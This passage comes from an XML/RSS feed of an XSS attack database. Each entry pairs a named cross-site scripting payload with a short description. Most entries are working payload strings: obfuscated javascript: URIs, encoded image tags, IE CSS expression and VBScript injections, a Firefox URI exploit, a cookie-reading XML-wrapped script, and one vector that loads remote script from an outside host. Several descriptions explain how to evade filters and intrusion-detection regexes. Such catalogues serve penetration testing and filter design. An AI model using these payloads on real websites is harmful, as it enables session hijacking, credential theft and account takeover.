<link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1972</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Firefox Lookups 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the ”feeling lucky” function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 15:14:56 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This uses a very tiny trick that appears to work Firefox only, because if it's implementation of the ”feeling lucky” function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It's simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.</ddb:exploitDescription>      <ddb:exploitName>Firefox Lookups 2</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, gecko</ddb:exploitTags>    </item>    <item>      <title>Firefox Lookups 3</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1973</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Firefox Lookups 3&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the ”feeling lucky” function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case ”google”).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, gecko&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:43:36 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the ”feeling lucky” function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case ”google”).</ddb:exploitDescription>      <ddb:exploitName>Firefox Lookups 3</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, gecko</ddb:exploitTags>    </item>    <item>      <title>firefoxurl: uri exploit (UXSS)</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2017</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;firefoxurl: uri exploit (UXSS)&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;firefoxurl:test|&quot;%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');&quot;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector creates an UXSS via firefoxurl:&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;URI exploits, general, injection, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;xs-sniper</description>      <pubDate>Tue, 24 Jul 07 10:38:51 -0400</pubDate>      <ddb:authorName>xs-sniper</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector creates an UXSS via firefoxurl:</ddb:exploitDescription>      <ddb:exploitName>firefoxurl: uri exploit (UXSS)</ddb:exploitName>      <ddb:exploitString>firefoxurl:test|&quot;%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');&quot;</ddb:exploitString>      <ddb:exploitTags>URI exploits, general, injection, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>FRAME</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1877</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;FRAME&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/FRAMESET&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Frame (Frames have the same sorts of XSS problems as iframes).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, style injection, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:13:59 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Frame (Frames have the same sorts of XSS problems as iframes).</ddb:exploitDescription>      <ddb:exploitName>FRAME</ddb:exploitName>      <ddb:exploitString>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/FRAMESET&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, style injection, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Grave Accents</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1927</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Grave Accents&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=`javascript:alert(&quot;RSnake says### 'XSS'&quot;)`&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:50:36 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Grave accent obfuscation (If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents).</ddb:exploitDescription>      <ddb:exploitName>Grave Accents</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=`javascript:alert(&quot;RSnake says### 'XSS'&quot;)`&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Half-Open HTML/JavaScript</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1949</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Half-Open HTML/JavaScript&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the ”javascript:” directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close &gt; tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:&lt;br&gt;&#9;/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ &lt;br&gt;As a side note, this was also effective against a real world XSS filter I came across using an open ended &lt;IFRAME tag instead of an &lt;IMG tag.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:21:23 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Unlike Firefox, the IE rendering engine doesn't add extra data to your page, but it does allow the ”javascript:” directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close &gt; tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:&#13;&#10;&#9;/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/ &#13;&#10;As a side note, this was also effective against a real world XSS filter I came across using an open ended &lt;IFRAME tag instead of an &lt;IMG tag.</ddb:exploitDescription>      <ddb:exploitName>Half-Open HTML/JavaScript</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;javascript:alert('XSS')&quot;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Hex Encoding</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1967</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Hex Encoding&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&lt;br&gt;The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex digit is not required.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:21:50 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>URL string evasion (assuming ”http://www.google.com/” is programmatically disallowed).&#13;&#10;The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex digit is not required.</ddb:exploitDescription>      <ddb:exploitName>Hex Encoding</ddb:exploitName>      <ddb:exploitString>&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated</ddb:exploitTags>    </item>    <item>      <title>Hex Encoding w/out Semicolons</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1932</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Hex Encoding w/out Semicolons&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string = ~ s/.*\&amp;#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:50:45 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Hex encoding without semicolons (this is also a viable XSS attack against the above string $tmp_string = ~ s/.*\&amp;#(\d+);.*/$1/; which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).</ddb:exploitDescription>      <ddb:exploitName>Hex Encoding w/out Semicolons</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>HTML Entities</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1926</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;HTML Entities&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;HTML entities (the semicolons are required for this to work).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:50:54 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>HTML entities (the semicolons are required for this to work).</ddb:exploitDescription>      <ddb:exploitName>HTML Entities</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>HTML Quoute &amp; Comment breaker</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1838</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;HTML Quoute &amp; Comment breaker&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;'';!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;{(alert(1))}&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks HTML quotes and comments.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, comment breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks HTML quotes and comments.</ddb:exploitDescription>      <ddb:exploitName>HTML Quoute &amp; Comment breaker</ddb:exploitName>      <ddb:exploitString>'';!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;{(alert(1))}</ddb:exploitString>      <ddb:exploitTags>general, html breaking, comment breaking</ddb:exploitTags>    </item>    <item>      <title>HTML wrapped in XML</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=3157</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;HTML wrapped in XML&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;br&gt;&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;&lt;br&gt;&lt;html:script&gt;&lt;br&gt;alert(document.cookie);&lt;br&gt;&lt;/html:script&gt;&lt;br&gt;&lt;/html:html&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses HTML wrapped in XML and can be used to circumvent common filters. This works in Gecko based browsers only.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, XML injection, evil tags, gecko, obfuscated&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;SIrDarckCat</description>      <pubDate>Tue, 04 Sep 07 08:14:05 -0400</pubDate>      <ddb:authorName>SIrDarckCat</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses HTML wrapped in XML and can be used to circumvent common filters. This works in Gecko based browsers only.</ddb:exploitDescription>      <ddb:exploitName>HTML wrapped in XML</ddb:exploitName>      <ddb:exploitString>&lt;?xml version=&quot;1.0&quot;?&gt;&#13;&#10;&lt;html:html xmlns:html='http://www.w3.org/1999/xhtml'&gt;&#13;&#10;&lt;html:script&gt;&#13;&#10;alert(document.cookie);&#13;&#10;&lt;/html:script&gt;&#13;&#10;&lt;/html:html&gt;</ddb:exploitString>      <ddb:exploitTags>general, XML injection, evil tags, gecko, obfuscated</ddb:exploitTags>    </item>    <item>      <title>IE backticked semicolon injection</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1835</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IE backticked semicolon injection&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;img src=`x` onrerror= ` ;; alert(1) ` /&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilized back ticks as attribute delimiters. This works only in IE.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilized back ticks as attribute delimiters. This works only in IE.</ddb:exploitDescription>      <ddb:exploitName>IE backticked semicolon injection</ddb:exploitName>      <ddb:exploitString>&lt;img src=`x` onrerror= ` ;; alert(1) ` /&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IE closing-tag expression injection</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1836</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IE closing-tag expression injection&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;/a style=&quot;&quot;xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector exploits a bug in IE whre attributes in closing comments are evaluated.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector exploits a bug in IE whre attributes in closing comments are evaluated.</ddb:exploitDescription>      <ddb:exploitName>IE closing-tag expression injection</ddb:exploitName>      <ddb:exploitString>&lt;/a style=&quot;&quot;xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, injection, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IE expression injection</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1834</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IE expression injection&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt; style=color: expression(alert(0));&quot; a=&quot;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes the feature of CSS expressions in IE.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, injection, internet explorer, style injection&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 15:33:42 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes the feature of CSS expressions in IE.</ddb:exploitDescription>      <ddb:exploitName>IE expression injection</ddb:exploitName>      <ddb:exploitString> style=color: expression(alert(0));&quot; a=&quot;</ddb:exploitString>      <ddb:exploitTags>general, injection, internet explorer, style injection</ddb:exploitTags>    </item>    <item>      <title>IE VB Messagebox injection</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1858</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IE VB Messagebox injection&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;vbscript:Execute(MsgBox(chr(88)&amp;chr(83)&amp;chr(83)))&lt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This injects VB code and produces a message box. IE only.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This injects VB code and produces a message box. IE only.</ddb:exploitDescription>      <ddb:exploitName>IE VB Messagebox injection</ddb:exploitName>      <ddb:exploitString>vbscript:Execute(MsgBox(chr(88)&amp;chr(83)&amp;chr(83)))&lt;</ddb:exploitString>      <ddb:exploitTags>general, basic, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IFRAME</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1878</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IFRAME&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IFRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/IFRAME&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Iframe (If iframes are allowed there are a lot of other XSS problems as well).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:14:15 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Iframe (If iframes are allowed there are a lot of other XSS problems as well).</ddb:exploitDescription>      <ddb:exploitName>IFRAME</ddb:exploitName>      <ddb:exploitString>&lt;IFRAME SRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;/IFRAME&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Image onerror wrapped in XML statement</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2087</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Image onerror wrapped in XML statement&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=&lt;a&gt;&lt;br&gt;&lt;b&gt;&lt;br&gt;%3c%69%6d%67%2f%73%72%63%3d%31&lt;br&gt;%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&lt;br&gt;&lt;/b&gt;&lt;br&gt;&lt;/a&gt;&lt;br&gt;document.write(unescape(a..b))&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector writes an erroneous image tag with onerror hanlder inside an E4X construct into the document context.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, obfuscated, gecko, XML predicates, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sat, 25 Aug 07 05:56:47 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector writes an erroneous image tag with onerror hanlder inside an E4X construct into the document context.</ddb:exploitDescription>      <ddb:exploitName>Image onerror wrapped in XML statement</ddb:exploitName>      <ddb:exploitString>a=&lt;a&gt;&#13;&#10;&lt;b&gt;&#13;&#10;%3c%69%6d%67%2f%73%72%63%3d%31&#13;&#10;%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e&#13;&#10;&lt;/b&gt;&#13;&#10;&lt;/a&gt;&#13;&#10;document.write(unescape(a..b))</ddb:exploitString>      <ddb:exploitTags>general, obfuscated, gecko, XML predicates, evil tags</ddb:exploitTags>    </item>    <item>      <title>Image tag with obfuscated JS URI</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2033</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Image tag with obfuscated JS URI&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;&lt;br&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;&lt;br&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector creates three image tags with differing CRLF obfuscation in the javascript: URI.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, obfuscated, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;OWASP</description>      <pubDate>Thu, 02 Aug 07 05:23:03 -0400</pubDate>      <ddb:authorName>OWASP</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector creates three image tags with differing CRLF obfuscation in the javascript: URI.</ddb:exploitDescription>      <ddb:exploitName>Image tag with obfuscated JS URI</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;&#13;&#10;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;&#13;&#10;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&lt;WBR&gt;'XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, basic, obfuscated, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Image w/CharCode</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1928</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Image w/CharCode&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=javascript:alert(String.fromCharCode(88###83###83))&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:51:18 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>If no quotes of any kind are allowed you can eval() a fromCharCode in JavaScript to create any XSS vector you need.</ddb:exploitDescription>      <ddb:exploitName>Image w/CharCode</ddb:exploitName>      <ddb:exploitString>&lt;IMG SRC=javascript:alert(String.fromCharCode(88###83###83))&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, obfuscated, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IMG Dynsrc</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1882</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG Dynsrc&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG DYNSRC=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;IMG Dynsrc&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:14:59 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>IMG Dynsrc</ddb:exploitDescription>      <ddb:exploitName>IMG Dynsrc</ddb:exploitName>      <ddb:exploitString>&lt;IMG DYNSRC=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, internet explorer</ddb:exploitTags>    </item>    <item>      <title>IMG Embedded commands 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1884</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;IMG Embedded commands 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain.  This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc...  This is one of the lesser used but more useful XSS vectors.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:15:19 -0400</pubDate> 